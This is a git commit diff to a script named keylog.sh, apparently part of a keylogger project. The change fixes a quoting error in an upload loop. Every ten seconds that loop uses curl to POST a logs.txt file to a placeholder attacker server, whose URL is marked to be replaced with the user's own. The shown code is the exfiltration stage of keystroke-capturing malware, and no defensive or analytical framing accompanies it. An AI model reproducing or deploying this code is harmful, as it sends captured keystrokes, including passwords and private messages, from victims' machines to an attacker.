ad3986f02943799fd21893667d1e3465890258c7
ᥴ̶̧̪̤̓͊̌̽̊̎̓͜͝͠ꪮ̵͈̀͐͗͒̽͛͊͝ꪀ̸̧̨̺̮̩̣̤͂̾͜ᦓ̵̠̂̅̈́̊ͅꪮ̶̢͇̟͆͗͆́̌͗͂͒̀͜͝ꪶ̴̨̧̖͍̞̲̖̠̆̽̈́̇̾̍̒̕͠ͅꫀ̵̡̨̧̛͚͕̝̭̦̩̻̈́̚̚ͅ <162306504+cons0le7@users.noreply.github.com>
2024-11-09 19:51:04 -0700

    Update keylog.sh

--- keylog.sh
+++ keylog.sh
@@ -6,7 +6,7 @@ upload_logs() {
     while true; do
         sleep 10 # Uploads logs every 10 seconds. Adjust as needed.
         if [ -f ./logs.txt ] && [ -s ./logs.txt ]; then
-            curl -X POST -F "file=@./logs.txt" "http://yourfuckingserverbitch.com # Replace with your server URL
+            curl -X POST -F "file=@./logs.txt" "http://yourfuckingserverbitch.com" #Replace with your server URL
         fi
     done
 }
